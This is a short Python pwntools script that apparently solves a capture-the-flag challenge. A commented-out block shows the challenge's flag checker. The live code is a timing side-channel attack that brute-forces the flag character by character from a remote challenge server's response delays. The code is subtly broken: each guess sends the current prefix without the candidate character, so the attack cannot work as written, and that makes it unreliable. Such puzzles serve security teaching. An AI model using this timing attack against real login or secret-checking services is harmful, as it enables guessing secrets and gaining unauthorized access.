import time
from pwn import *

#flag = open('flag.txt', 'r').readline().strip('\n').lower()
#print("[+] Guess the flag >>> ")

#user_guess = input().lower()

#for i in range(0, len(flag)):
#    if i+1 > len(user_guess):
#        print("\n[!] Incorrect")
#        exit(-1)
#    elif (user_guess[i] != flag[i]):
#        print("\n[!] Incorrect")
#        exit(-1)
#    else:
#        time.sleep(0.25)

#print("\n[+] Access Granted. Your Flag is: %s" %flag)
import string

flag = 'us'
bank = string.ascii_lowercase + '_'+'{'+'}'
max_time = 1.8

for _ in range(0x20):
    for s in bank:
        io = remote('0.cloud.chals.io', 29427)
        io.sendline(flag)
        start = time.time()
        io.recvuntil('[!]')
        time.sleep(1)
        end = time.time()
        elapsed = round(end - start, 2)
        if elapsed > (max_time):
            print(elapsed)
            flag += s
            max_time = round(elapsed, 2)
            print("Current flag: ", flag)


io.interactive()
